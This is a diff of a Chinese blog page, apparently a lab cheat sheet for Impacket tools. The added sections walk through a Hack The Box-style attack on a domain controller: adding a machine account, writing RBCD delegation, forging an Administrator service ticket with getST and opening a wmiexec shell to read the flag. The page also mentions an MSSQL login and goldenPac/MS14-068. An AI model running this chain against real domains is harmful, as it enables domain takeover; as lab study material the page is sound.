@@ -9,7 +9,7 @@
 <meta name="description" content="mssqlclient 登录 mssql 数据库。
 ┌──(kali㉿kali)-[~/Work/Kali/Mantis] └─$ impacket-mssqlclient admin:&#39;m$$ql_S@_P@ssW0rd!&#39;@10.129.26.95 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;. [*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server 2014 RTM (no SP) (12.0.2000) [!] Press help for extra shell commands SQL (admin admin@master)&gt; goldenPac goldenPac 让一个普通域用户在 Kerberos 认证中被当成高权限用户。该工具利用的是 MS14-068 / CVE-2014-6324 的旧版 Kerberos KDC 漏洞，需要有一个有效的普通域账号密码，就能构造带有伪造 PAC 权限信息的 Kerberos 请求，让未打补丁的域控错误地接受 “该用户属于高权限组” 的声明。
 " />
-<meta name="keywords" content=", Hack, MSSQL, Impacket, goldenPac, lookupsids, GetUserSPNs, GetNPUsers, Securetsdump" />
+<meta name="keywords" content=", Hack, MSSQL, Impacket, goldenPac, lookupsids, GetUserSPNs, GetNPUsers, Securetsdump, Addcomputer, RBCD, getST, Wmiexec" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
 <link rel="canonical" href="http://localhost:1313/tools/impacket-%E5%A5%97%E4%BB%B6/" />
@@ -46,8 +46,8 @@
 ┌──(kali㉿kali)-[~/Work/Kali/Mantis] └─$ impacket-mssqlclient admin:&#39;m$$ql_S@_P@ssW0rd!&#39;@10.129.26.95 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;. [*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server 2014 RTM (no SP) (12.0.2000) [!] Press help for extra shell commands SQL (admin admin@master)&gt; goldenPac goldenPac 让一个普通域用户在 Kerberos 认证中被当成高权限用户。该工具利用的是 MS14-068 / CVE-2014-6324 的旧版 Kerberos KDC 漏洞，需要有一个有效的普通域账号密码，就能构造带有伪造 PAC 权限信息的 Kerberos 请求，让未打补丁的域控错误地接受 “该用户属于高权限组” 的声明。">
   <meta itemprop="datePublished" content="2026-07-03T14:00:00+08:00">
   <meta itemprop="dateModified" content="2026-07-03T14:00:00+08:00">
-  <meta itemprop="wordCount" content="1199">
-  <meta itemprop="keywords" content="Hack,MSSQL,Impacket,GoldenPac,Lookupsids,GetUserSPNs,GetNPUsers,Securetsdump">
+  <meta itemprop="wordCount" content="1484">
+  <meta itemprop="keywords" content="Hack,MSSQL,Impacket,GoldenPac,Lookupsids,GetUserSPNs,GetNPUsers,Securetsdump,Addcomputer,RBCD,GetST,Wmiexec">
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Impacket 套件">
@@ -141,6 +141,10 @@
     <li><a href="#getnpusers">GetNPUsers</a></li>
     <li><a href="#getuserspns">GetUserSPNs</a></li>
     <li><a href="#securetsdump">Securetsdump</a></li>
+    <li><a href="#addcomputer">Addcomputer</a></li>
+    <li><a href="#rbcd">RBCD</a></li>
+    <li><a href="#getst">getST</a></li>
+    <li><a href="#wmiexec">Wmiexec</a></li>
   </ul>
 </nav>
                 </aside>
@@ -440,6 +444,76 @@
 </span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..<span style="color:#ae81ff">\D</span>esktop
 </span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; type root.txt
 </span></span><span style="display:flex;"><span>5183e6faa81a508920196120306ef1c2
+</span></span></code></pre></div><h2 id="addcomputer">Addcomputer</h2>
+<p>创建一个可控的域计算机账户，账户名为 <code>PWN$</code>，密码为 <code>123456</code>，后续会用 <code>support.htb/PWN$:123456</code> 向 KDC 请求 Kerberos 票据。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Support<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-addcomputer -computer-name <span style="color:#e6db74">&#39;PWN$&#39;</span> -computer-pass <span style="color:#e6db74">&#39;123456&#39;</span> -dc-ip 10.129.23.95 <span style="color:#e6db74">&#39;support.htb/support:Ironside47pleasure40Watchful&#39;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully added machine account PWN$ with password 123456.
+</span></span></code></pre></div><h2 id="rbcd">RBCD</h2>
+<p>RBCD 是 Resource-Based Constrained Delegation，基于资源的受限委派。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Support<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-rbcd -delegate-from <span style="color:#e6db74">&#39;PWN$&#39;</span> -delegate-to <span style="color:#e6db74">&#39;DC$&#39;</span> -action <span style="color:#e6db74">&#39;write&#39;</span> -dc-ip 10.129.23.95 <span style="color:#e6db74">&#39;support.htb/support:Ironside47pleasure40Watchful&#39;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Delegation rights modified successfully!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PWN$ can now impersonate users on DC$ via S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Accounts allowed to act on behalf of other identity:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     PWN$         <span style="color:#f92672">(</span>S-1-5-21-1677581083-3380853377-188903654-6101<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="getst">getST</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Support<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-getST -spn <span style="color:#e6db74">&#39;cifs/DC.support.htb&#39;</span> -impersonate <span style="color:#e6db74">&#39;Administrator&#39;</span> -dc-ip 10.129.23.95 <span style="color:#e6db74">&#39;support.htb/PWN$:123456&#39;</span>      
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> CCache file is not found. Skipping...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Impersonating Administrator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2self
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
+</span></span></code></pre></div><h2 id="wmiexec">Wmiexec</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Support<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-wmiexec -k -no-pass -target-ip 10.129.23.95 dc.support.htb
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBv3.0 dialect used
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Launching semi-interactive shell - Careful what you execute
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\&gt;</span>whoami
+</span></span><span style="display:flex;"><span>support<span style="color:#ae81ff">\a</span>dministrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\&gt;</span>cd Users
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers&gt;dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 955A-5CBB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\U</span>sers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>07/26/2022  06:21 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>05/28/2022  04:11 AM    &lt;DIR&gt;          Administrator
+</span></span><span style="display:flex;"><span>07/26/2022  06:21 AM    &lt;DIR&gt;          ldap
+</span></span><span style="display:flex;"><span>05/19/2022  02:13 AM    &lt;DIR&gt;          Public
+</span></span><span style="display:flex;"><span>04/23/2026  03:02 AM    &lt;DIR&gt;          support
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>              <span style="color:#ae81ff">0</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">5</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   3,970,932,736 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers&gt;cd Administrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 955A-5CBB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>05/28/2022  04:17 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>05/28/2022  04:11 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>04/23/2026  02:12 AM                <span style="color:#ae81ff">34</span> root.txt
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">34</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   3,970,932,736 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;type root.txt
+</span></span><span style="display:flex;"><span>4a28f1303938*******3666979acc4e
 </span></span></code></pre></div>
             </div>
         </article>
@@ -459,6 +533,10 @@
         <span class="tag"><a href="http://localhost:1313/tags/getuserspns/">GetUserSPNs</a></span>
         <span class="tag"><a href="http://localhost:1313/tags/getnpusers/">GetNPUsers</a></span>
         <span class="tag"><a href="http://localhost:1313/tags/securetsdump/">Securetsdump</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/addcomputer/">Addcomputer</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/rbcd/">RBCD</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/getst/">getST</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/wmiexec/">Wmiexec</a></span>
         
     </p>
 
